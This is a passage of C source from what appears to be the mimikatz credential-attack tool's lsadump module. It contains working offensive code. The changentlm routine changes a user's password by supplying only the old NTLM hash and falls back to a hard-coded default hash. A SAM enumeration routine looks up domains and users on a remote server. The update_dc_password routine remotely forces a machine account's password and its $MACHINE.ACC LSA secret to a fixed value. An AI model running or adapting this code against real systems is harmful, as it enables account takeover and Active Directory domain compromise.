	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
*/
NTSTATUS CALLBACK kuhl_m_lsadump_changentlm_callback(SAMPR_HANDLE hUser, PVOID pvArg)
{
	PKUHL_M_LSADUMP_CHANGENTLM_DATA data = (PKUHL_M_LSADUMP_CHANGENTLM_DATA) pvArg;
	NTSTATUS status = SamiChangePasswordUser(hUser, data->isOldLM, data->oldLM, data->newLM, data->isNewNTLM, data->oldNTLM, data->newNTLM);
	if(NT_SUCCESS(status))
		kprintf(L"\n>> Change password is a success!\n");
	else if(status == STATUS_WRONG_PASSWORD)
		PRINT_ERROR(L"Bad old NTLM hash or password!\n");
	else if(status == STATUS_PASSWORD_RESTRICTION)
		PRINT_ERROR(L"Bad new NTLM hash or password! (restriction)\n");
	else PRINT_ERROR(L"SamiChangePasswordUser: %08x\n", status);
	return status;
}

NTSTATUS kuhl_m_lsadump_changentlm(int argc, wchar_t * argv[])
{
	NTSTATUS status0 = STATUS_DATA_ERROR, status1 = STATUS_DATA_ERROR;
	LSA_UNICODE_STRING password;
	PCWCHAR szPassword;
	KUHL_M_LSADUMP_CHANGENTLM_DATA infos = {FALSE, {0}, {0}, TRUE, {0}, {0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6}};

	if(kull_m_string_args_byName(argc, argv, L"oldpassword", &szPassword, NULL))
	{
		RtlInitUnicodeString(&password, szPassword);
		status0 = RtlCalculateNtOwfPassword(&password, infos.oldNTLM);
		if(!NT_SUCCESS(status0))
			PRINT_ERROR(L"Unable to digest NTLM hash from old password: %08x\n", status0);
	}
	else if(kull_m_string_args_byName(argc, argv, L"oldntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"old", &szPassword, NULL))
	{
		status0 = kull_m_string_stringToHex(szPassword, infos.oldNTLM, sizeof(infos.oldNTLM)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
		if(!NT_SUCCESS(status0))
			PRINT_ERROR(L"Unable to convert \'%s\' to old NTLM hash (16 bytes)\n", szPassword);
	}
	else PRINT_ERROR(L"Argument /oldpassword: or /oldntlm: is needed\n");

	if(kull_m_string_args_byName(argc, argv, L"newpassword", &szPassword, NULL))
	{
		RtlInitUnicodeString(&password, szPassword);
		status1 = RtlCalculateNtOwfPassword(&password, infos.newNTLM);
		if(!NT_SUCCESS(status1))
			PRINT_ERROR(L"Unable to digest NTLM hash from new password: %08x\n", status1);
	}
	else if(kull_m_string_args_byName(argc, argv, L"newntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"new", &szPassword, NULL))
	{
		status1 = kull_m_string_stringToHex(szPassword, infos.newNTLM, sizeof(infos.newNTLM)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
		if(!NT_SUCCESS(status1))
			PRINT_ERROR(L"Unable to convert \'%s\' to new NTLM hash (16 bytes)\n", szPassword);
	}
	else
	{
		kprintf(L"** No new credentials provided, will use the default one **\n");
		status1 = STATUS_SUCCESS;
	}

	if(NT_SUCCESS(status0) && NT_SUCCESS(status1))
	{
		kprintf(L"OLD NTLM     : ");
		kull_m_string_wprintf_hex(infos.oldNTLM, sizeof(infos.oldNTLM), 0);
		kprintf(L"\nNEW NTLM     : ");
		kull_m_string_wprintf_hex(infos.newNTLM, sizeof(infos.newNTLM), 0);
		kprintf(L"\n\n");
		status0 = kuhl_m_lsadump_enumdomains_users(argc, argv, USER_CHANGE_PASSWORD, kuhl_m_lsadump_changentlm_callback, &infos);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_lsadump_enumdomains_users(int argc, wchar_t * argv[], DWORD dwUserAccess, PKUHL_M_LSADUMP_DOMAINUSER callback, PVOID pvArg)
{
	NTSTATUS status = STATUS_INVALID_ACCOUNT_NAME;
	LSA_UNICODE_STRING serverName, userName;
	PCWCHAR szServer, szUser;
	BOOL isUser = FALSE, isRid = FALSE;
	DWORD rid = 0;

	kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL);
	RtlInitUnicodeString(&serverName, szServer ? szServer : L"");
	kprintf(L"Target server: %wZ\n", &serverName);
	if(isUser = kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
	{
		RtlInitUnicodeString(&userName, szUser);
		kprintf(L"Target user  : %wZ\n", &userName);
	}
	else if(isRid = kull_m_string_args_byName(argc, argv, L"rid", &szUser, NULL))
	{
		rid = wcstoul(szUser, NULL, 0);
		kprintf(L"Target RID   : %u\n", rid);
	}

	if(isUser || isRid)
	{
		status = kuhl_m_lsadump_enumdomains_users_data(&serverName, isUser ? &userName : NULL, rid, dwUserAccess, callback, pvArg);
	}
	else PRINT_ERROR(L"/user or /rid is needed\n");

	return status;
}

DECLARE_CONST_UNICODE_STRING(uBuiltin, L"Builtin");
NTSTATUS kuhl_m_lsadump_enumdomains_users_data(PLSA_UNICODE_STRING uServerName, PLSA_UNICODE_STRING uUserName, DWORD rid, DWORD dwUserAccess, PKUHL_M_LSADUMP_DOMAINUSER callback, PVOID pvArg)
{
	NTSTATUS status = STATUS_INVALID_ACCOUNT_NAME, enumDomainStatus;
	DWORD i, domainEnumerationContext = 0, domainCountRetourned, *pRid, *pUse;
	PSAMPR_RID_ENUMERATION pEnumDomainBuffer;
	PSID domainSid;
	SAMPR_HANDLE hServerHandle, hDomainHandle, hUserHandle;

	if(uUserName || rid)
	{
		status = SamConnect(uServerName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
		if(NT_SUCCESS(status))
		{
			do
			{
				enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
				if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
				{
					for(i = 0; i < domainCountRetourned; i++)
					{
						if(RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &uBuiltin, TRUE))
							continue;
						kprintf(L"Domain name  : %wZ\n", &pEnumDomainBuffer[i].Name);
						status = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
						if(NT_SUCCESS(status))
						{
							kprintf(L"Domain SID   : ");
							kull_m_string_displaySID(domainSid);
							kprintf(L"\n");
							status = SamOpenDomain(hServerHandle, DOMAIN_LOOKUP, domainSid, &hDomainHandle);
							if(NT_SUCCESS(status))
							{
								if(uUserName)
								{
									pRid = NULL;
									pUse = NULL;
									status = SamLookupNamesInDomain(hDomainHandle, 1, uUserName, &pRid, &pUse);
									if(NT_SUCCESS(status))
									{
										rid = pRid[0];
										if(pRid)
											SamFreeMemory(pRid);
										if(pUse)
											SamFreeMemory(pUse);
									}
									else PRINT_ERROR(L"SamLookupNamesInDomain: %08x\n", status);
								}

								if(rid)
								{
									kprintf(L"User RID     : %u\n", rid);
									status = SamOpenUser(hDomainHandle, dwUserAccess, rid, &hUserHandle);
									if(NT_SUCCESS(status))
									{
										status = callback(hUserHandle, pvArg);
										SamCloseHandle(hUserHandle);
									}
									else PRINT_ERROR(L"SamOpenUser: %08x\n", status);
								}
								else PRINT_ERROR(L"No RID\n");
								SamCloseHandle(hDomainHandle);
							}
							else PRINT_ERROR(L"SamOpenDomain: %08x\n", status);
							SamFreeMemory(domainSid);
						}
						else PRINT_ERROR(L"SamLookupDomainInSamServer: %08x\n", status);
					}
					SamFreeMemory(pEnumDomainBuffer);
				}
				else PRINT_ERROR(L"SamEnumerateDomainsInSamServer: %08x\n", enumDomainStatus);
			}
			while(enumDomainStatus == STATUS_MORE_ENTRIES);
			SamCloseHandle(hServerHandle);
		}
		else PRINT_ERROR(L"SamConnect: %08x\n", status);
	}
	else PRINT_ERROR(L"username or rid is needed\n");

	return status;
}

PCWCHAR PACKAGES_FLAGS[] = {
	L"INTEGRITY", L"PRIVACY", L"TOKEN_ONLY", L"DATAGRAM",
	L"CONNECTION", L"MULTI_REQUIRED", L"CLIENT_ONLY", L"EXTENDED_ERROR",
	L"IMPERSONATION", L"ACCEPT_WIN32_NAME", L"STREAM", L"NEGOTIABLE",
	L"GSS_COMPATIBLE", L"LOGON", L"ASCII_BUFFERS", L"FRAGMENT",
	L"MUTUAL_AUTH", L"DELEGATION", L"READONLY_WITH_CHECKSUM", L"RESTRICTED_TOKENS",
	L"NEGO_EXTENDER", L"NEGOTIABLE2", L"APPCONTAINER_PASSTHROUGH", L"APPCONTAINER_CHECKS",
};
NTSTATUS kuhl_m_lsadump_packages(int argc, wchar_t * argv[])
{
	SECURITY_STATUS status;
	ULONG cPackages, i, j;
	PSecPkgInfo pPackageInfo;
	CredHandle hCred;
	CtxtHandle hCtx;
	SecBuffer OutBuff = {0, SECBUFFER_TOKEN, NULL};
	SecBufferDesc Output = {SECBUFFER_VERSION, 1, &OutBuff};
	ULONG ContextAttr;

	status = EnumerateSecurityPackages(&cPackages, &pPackageInfo);
	if(status == SEC_E_OK)
	{
		for(i = 0; i < cPackages; i++)
		{
			kprintf(L"Name        : %s\nDescription : %s\nCapabilities: %08x ( ", pPackageInfo[i].Name, pPackageInfo[i].Comment, pPackageInfo[i].fCapabilities);
			for(j = 0; j < sizeof(ULONG) * 8; j++)
				if((pPackageInfo[i].fCapabilities >> j) & 1)
					kprintf(L"%s ; ", (j < ARRAYSIZE(PACKAGES_FLAGS)) ? PACKAGES_FLAGS[j] : L"?");
			kprintf(L")\nMaxToken    : %u\nRPCID       : 0x%04x (%hu)\nVersion     : %hu\n", pPackageInfo[i].cbMaxToken, pPackageInfo[i].wRPCID, pPackageInfo[i].wRPCID, pPackageInfo[i].wVersion);

			if(argc)
			{
				status = AcquireCredentialsHandle(NULL, pPackageInfo[i].Name, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCred, NULL);
				if(status == SEC_E_OK)
				{
					status = InitializeSecurityContext(&hCred, NULL, argv[0], ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, NULL, 0, &hCtx, &Output, &ContextAttr, NULL);
					if((status == SEC_E_OK) || (status == SEC_I_COMPLETE_AND_CONTINUE)  || (status == SEC_I_COMPLETE_NEEDED)  || (status == SEC_I_CONTINUE_NEEDED)  || (status == SEC_I_INCOMPLETE_CREDENTIALS)  || (status == SEC_E_INCOMPLETE_MESSAGE))
					{
						kull_m_string_wprintf_hex(OutBuff.pvBuffer, OutBuff.cbBuffer, 1 | (16 << 16));
						kprintf(L"\n");
						if(OutBuff.pvBuffer)
							FreeContextBuffer(OutBuff.pvBuffer);
						DeleteSecurityContext(&hCtx);
					}
					else PRINT_ERROR(L"InitializeSecurityContext: 0x%08x\n", status);
					FreeCredentialHandle(&hCred);
				}
				else PRINT_ERROR(L"AcquireCredentialsHandle: 0x%08x\n", status);
			}
			kprintf(L"\n");
		}
		FreeContextBuffer(pPackageInfo);
	}
	else PRINT_ERROR(L"EnumerateSecurityPackages: 0x%08x\n", status);
	return STATUS_SUCCESS;
}

NTSTATUS CALLBACK kuhl_m_lsadump_update_dc_password_callback(SAMPR_HANDLE hUser, PVOID pvArg)
{
	NTSTATUS status = SamSetInformationUser(hUser, UserSetPasswordInformation, (PSAMPR_USER_INFO_BUFFER) pvArg);
	if(NT_SUCCESS(status))
		kprintf(L"\n  > Password updated (to %wZ)\n", pvArg);
	else PRINT_ERROR(L"SamSetInformationUser: %08x\n", status);
	return status;
}

DECLARE_CONST_UNICODE_STRING(uMachineAccountPassword, L"Waza1234/Waza1234/Waza1234/");
DECLARE_CONST_UNICODE_STRING(uMachineSecretName, L"$MACHINE.ACC");
NTSTATUS kuhl_m_lsadump_update_dc_password(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	PCWCHAR szTarget, szAccount;
	UNICODE_STRING Target, AccoutName;
	LSA_OBJECT_ATTRIBUTES ObjectAttributes = {0};
	LSA_HANDLE hPolicy, hSecret;
	ObjectAttributes.Length = sizeof(ObjectAttributes);

	kprintf(L"\nProcedure to update AD domain password and its local stored password remotely\nmimic `netdom resetpwd`, experimental & best situation after reboot\n\n");
	if(kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL))
	{
		RtlInitUnicodeString(&Target, szTarget);
		kprintf(L"Target : %wZ\n", &Target);
		if(kull_m_string_args_byName(argc, argv, L"account", &szAccount, NULL))
		{
			RtlInitUnicodeString(&AccoutName, szAccount);
			kprintf(L"Account: %wZ\n\n* SAM information\n\n", &AccoutName);
			status = kuhl_m_lsadump_enumdomains_users_data(&Target, &AccoutName, 0, USER_FORCE_PASSWORD_CHANGE, kuhl_m_lsadump_update_dc_password_callback, (PVOID) &uMachineAccountPassword);
			if(status == STATUS_SUCCESS)
			{
				kprintf(L"\n* Computer stored password\n\n");
				status = LsaOpenPolicy(&Target, &ObjectAttributes, POLICY_CREATE_SECRET, &hPolicy);
				if(status == STATUS_SUCCESS)
				{
					status = LsaOpenSecret(hPolicy, (PLSA_UNICODE_STRING) &uMachineSecretName, SECRET_SET_VALUE, &hSecret);
					if(status == STATUS_SUCCESS)
					{
						status = LsaSetSecret(hSecret, (PLSA_UNICODE_STRING) &uMachineAccountPassword, (PLSA_UNICODE_STRING) &uMachineAccountPassword);
						if(status == STATUS_SUCCESS)
						{
							kprintf(L"  > Password updated (to %wZ)\n", &uMachineAccountPassword);
						}
						else PRINT_ERROR(L"LsaSetSecret: 0x%08x\n", status);
						LsaClose(hSecret);
					}
					else PRINT_ERROR(L"LsaOpenSecret: 0x%08x\n", status);
					LsaClose(hPolicy);
				}
				else PRINT_ERROR(L"LsaOpenPolicy: 0x%08x\n", status);
			}
		}
		else PRINT_ERROR(L"A /account argument is needed\n");
	}
	else PRINT_ERROR(L"A /target argument is needed\n");

	return STATUS_SUCCESS;
}